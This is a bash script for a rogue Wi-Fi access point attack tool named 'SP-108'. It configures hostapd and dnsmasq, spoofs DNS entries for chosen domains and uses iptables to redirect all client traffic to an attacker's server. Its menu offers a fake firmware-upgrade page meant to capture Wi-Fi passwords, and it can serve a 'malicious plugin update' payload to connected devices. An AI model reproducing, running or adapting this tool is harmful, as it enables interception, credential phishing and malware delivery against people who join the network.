#!/bin/bash

BGreen='\033[1;32m'
Bs='\033[1;33m'
NC='\033[0m'
BBlue='\033[1;34m'

function show_banner() {
	clear
	echo -e "\n${Bs}SP-108${NC} ðŸ•‰ \n"
	echo -e "Copyright (c) 2021, z3r0day
All rights reserved.\n"

}

show_banner


function Domain_ip_add() {
	read -p "[^] Enter the Domain: " DOMAIN
	read -p "[^] Enter the IP: " IPADDR
	echo ${IPADDR} ${DOMAIN} >> fakehosts.conf
}

function loop() {
	NUM=0
	while [ ${NUM} -lt ${1} ]
	do
		Domain_ip_add
		((NUM++))
	done
	
}

function Redirect_custom() {
	echo -e "\n[${BGreen}+${NC}] This will allows you to redirect all traffic to${BRed} one device in network!${NC}"
	echo -e "[${BGreen}+${NC}] ${BBlue}****${NC}Note that devices connecting to AP will not have internet access${BBlue}****${NC}"
	read -p "[^] Enter the interface hosting AP: " INTERACE
	read -p "[^] Enter the target server IP: " REDIP
	read -p "[^] Enter the target port: " REDPORT
	read -p "[^] Do you want to run a Fake Firmware Upgrade Page to sniff wifi password(y/n) [requires python3]: " YN
	if [ ${YN} = "y" ]
	then
		$(cd wifi_update/ && python3 -m http.server ${REDPORT} &> server.output) &
		echo -e "[${BGreen}+${NC}] Firmware update server up....."
	elif [ ${YN} = "n" ]
	then
		read -p "[^] Do you want to deliever a malicious plugin update(y/n) [requires python3]: " YN
		if [ ${YN} = "y" ]
		then
			read -p "[^] Enter the path of the folder containing payload[requires python3]: " Path
			cp ${Path} plugin_update/
			$(cd plugin_update/ && python3 -m http.server ${REDPORT} &> server.output) &
			echo -e "[${BGreen}+${NC}] Plugin update server up....."			 
		fi

	fi
	iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination ${REDIP}:${REDPORT}
	iptables --append FORWARD --in-interface ${INTERACE} -j ACCEPT
}

function IP_addressing() {
	read -p "[^] choose IP addressing option for access point network (d/c) d[default] c[custom]: " IPOPTION
	read -p "[^] Enter the interface hosting ap: " INTRRACE
	if [ ${IPOPTION} = "d" ]
	then
		echo -e "\n[${BGreen}+${NC}] selecting default configuration of network"
		ifconfig ${INTRRACE} up 192.168.1.1 netmask 255.255.255.0
		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
		check_file_make_backup /etc/dnsmasq.conf
		echo "interface=${INTRRACE}" > /etc/dnsmasq.conf
		echo "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> /etc/dnsmasq.conf
		echo "dhcp-option=3,192.168.1.1" >> /etc/dnsmasq.conf
		echo "dhcp-option=6,192.168.1.1" >> /etc/dnsmasq.conf
		echo "server=8.8.8.8" >> /etc/dnsmasq.conf
		echo "log-queries" >> /etc/dnsmasq.conf
		echo "log-dhcp" >> /etc/dnsmasq.conf
		echo "listen-address=127.0.0.1" >> /etc/dnsmasq.conf
		read -p "[^] Do you want to redirect specific domains to specific IPs(y/n): " YN
		if [ ${YN} = "y" ]
		then
			read -p "[^] How many domains do you want to add: " NUMB
			loop ${NUMB}
			$(dnsmasq -C /etc/dnsmasq.conf -d -H fakehosts.conf &> $(date +%T%F)_dnsmasq.output) &
			echo -e "\n[${BGreen}+${NC}] DHCP up and ${BRed}running...${NC}"
		else
			$(dnsmasq -C /etc/dnsmasq.conf -d &> $(date +%T%F)_dnsmasq.output) &
			echo -e "\n[${BGreen}+${NC}] DHCP up and ${BRed}running...${NC}"
		fi
			
	elif [ ${IPOPTION} = "c" ]
	then
		echo -e "\n[${BGreen}+${NC}] selecting custom configuration for ap network"
		read -p "[^] Enter the name of interface to use for internet access: " INTFACE
		read -p "[^] Enter the starting IP: " IP1
		read -p "[^] Enter the ending IP: " IP2
		read -p "[^] Enter the subnet mask: " MASK
		read -p "[^] Enter the network addres: " NETWORK
		read -p "[^] Enter the gateway ip to assign to interface: " GATEWAYIP
		read -p "[^] Enter the dhcp lease time in hours [x]h: " LEASE
		read -p "[^] Enter the dhcp server address to use: " DHCP
		read -p "[^] Enter the dhcp listen address for ap (previously added gateway address recommended): " DHCPIP
		check_file_make_backup /etc/dnsmasq.conf
		echo "interface=${INTRRACE}" > /etc/dnsmasq.conf
		echo "dhcp-range=${IP1},${IP2},${MASK},${LEASE}" >> /etc/dnsmasq.conf
		echo "dhcp-option=3,${GATEWAYIP}" >> /etc/dnsmasq.conf
		echo "dhcp-option=6,${GATEWAYIP}" >> /etc/dnsmasq.conf
		echo "server=${DHCP}" >> /etc/dnsmasq.conf
		echo "log-queries" >> /etc/dnsmasq.conf
		echo "log-dhcp" >> /etc/dnsmasq.conf
		echo "listen-address=${DHCPIP}" >> /etc/dnsmasq.conf
		ifconfig ${INTRRACE} up ${GATEWAY} netmask ${MASK}
		route add -net ${NETWORK} netmask ${MASK} gw ${GATEWAY}
		read -p "[^] Do you want to redirect specific domains to specific IPs: " YN
		read -p "[^] Do you want to redirect specific domains to specific IPs(y/n): " YN
		if [ ${YN} = "y" ]
		then
			read -p "[^] How many domains do you want to add: " NUMB
			loop ${NUMB}
			$(dnsmasq -C /etc/dnsmasq.conf -d -H fakehosts.conf &> $(date +%T%F)_dnsmasq.output) &
			echo -e "\n[${BGreen}+${NC}] DHCP up and ${BRed}running...${NC}"
		else
			$(dnsmasq -C /etc/dnsmasq.conf -d &> $(date +%T%F)_dnsmasq.output) &
			echo -e "\n[${BGreen}+${NC}] DHCP up and ${BRed}running...${NC}"
		fi

	else
		echo -e "\n[${BRed}!${NC}] select a valid option"
		clear && IP_addressing
	fi
}

function Internet_Access() {
	read -p "[^] Enter the name of interface to use for internet access: " INTFACE
	read -p "[^] Enter the interface hosting ap: " INTFACE1
	iptables --table nat --append POSTROUTING --out-interface ${INTFACE} -j MASQUERADE
	echo -e "\n[${BGreen}+${NC}] Enabling ${BRed}forwarding now..${NC}"
	iptables --append FORWARD --in-interface ${INTFACE1} -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward
	echo -e "\n[${BGreen}+${NC}] All the devices connecting to AP will now have ${BRed}internet access${NC}"
} 

function check_file_make_backup() {
	if [ -e ${1} ]
	then 
		echo -e "\n[${BGreen}+${NC}] Default File location Found ${BRed}${1}${NC}"
		echo -e "[${BGreen}+${NC}] Moving ${1} to ${Bred}${1}.bak${NC}"
		cat ${1} > ${1}.bak
		
	else
		echo -e "\n[${BGreen}+${NC}] default location ${BRed}not found.${NC}"
		
	fi
}

function boot_access_point() {
	echo -e "\n[${BGreen}+${NC}] writing output to${BRed}$(date +%T%F)_hostapd.output${NC}"
	$(hostapd /etc/hostapd/hostapd.conf &> $(date +%T%F)_hostapd.output) &
	if [ ${?} -ne 0 ]
	then
		echo -e "\n[${BGreen}+${NC}] something went wrong!${BRed}${NC}"
	else
		echo -e "[${BGreen}+${NC}] access point ${BRed}${SSID}${NC} up."
	fi
}

function Saffron() {
	echo -e "\n[${BGreen}+${NC}] Booting up the ${BRed}access point...${NC}"
	read -p "[^] Enter the name of interface in monitor mode: " INTERFACE
	check_file_make_backup /etc/hostapd/hostapd.conf
	echo "interface=${INTERFACE}" > /etc/hostapd/hostapd.conf
	echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
	read -p "[^] Enter the SSID: " SSID 
	echo "ssid=${SSID}" >> /etc/hostapd/hostapd.conf
	echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
	read -p "[^] Enter the Channel(1-14): " CHANNEL
	echo "channel=${CHANNEL}" >> /etc/hostapd/hostapd.conf
	echo "macaddr_acl=0" >> /etc/hostapd/hostapd.conf
	echo "ignore_broadcast_ssid=0" >> /etc/hostapd/hostapd.conf
	echo "auth_algs=1" >> /etc/hostapd/hostapd.conf
	echo "wpa=2" >> /etc/hostapd/hostapd.conf
	read -p "[^] Enter the passphrase for access point: " SSAP
	echo "wpa_passphrase=${SSAP}" >> /etc/hostapd/hostapd.conf
	echo "wpa_key_mgmt=WPA-PSK" >> /etc/hostapd/hostapd.conf 
	echo "wpa_pairwise=CCMP" >> /etc/hostapd/hostapd.conf
	echo "wpa_group_rekey=86400" >> /etc/hostapd/hostapd.conf
	echo "ieee80211n=1" >> /etc/hostapd/hostapd.conf
	echo "wme_enabled=1" >> /etc/hostapd/hostapd.conf
	echo -e "\n[${BGreen}+${NC}] configuration file${BRed} successfully written!${NC}\n"
	echo -e "\n[${BGreen}+${NC}] Booting up the ${BRed}access point...${NC}"
	boot_access_point&
}

function kill_module() {
	echo -e "[${BGreen}+${NC}] This will allow you to reset/stop individual module"
	PS3=$(echo -e "\n${BRed}SP-108${NC}@$(uname -a | awk '{print $2}')~ ")
	echo -e "[${BGreen}+${NC}] Choose the option ${BRed}number${NC} from menu below! \n"
	select answer in "killAP" "killDNS" "ResetIPtables" "clear" "exit"  
	do
		if [ $answer = "exit" ]
		then
			break
			exit
		fi
			case $answer in
				killAP)
					killall hostapd;;
				killDNS)
					killall dnsmasq;;
				ResetIPtables)
					iptables --flush && iptables -t nat --flush;;
				clear)
					clear && show_banner;;
		esac
	done
}

function soul() {

	PS3=$(echo -e "\n${BRed}SP-108${NC}@$(uname -a | awk '{print $2}')~ ")
	echo -e "[${BGreen}+${NC}] Choose the option ${BRed}number${NC} from menu below! \n"
	select answer in "Saffron" "IP_addressing" "Internet_Access"  "Redirect_custom" "clear" "kill_module" "exit"  
	do
		if [ $answer = "exit" ]
		then
			break
			exit
		fi
			case $answer in
				Saffron)
					Saffron;;
				Internet_Access)
					Internet_Access;;
				IP_addressing)
					IP_addressing;;
				Redirect_custom)
					Redirect_custom;;
				kill_module)
					kill_module;;
				clear)
					clear && show_banner;;
		esac
	done
}

soul
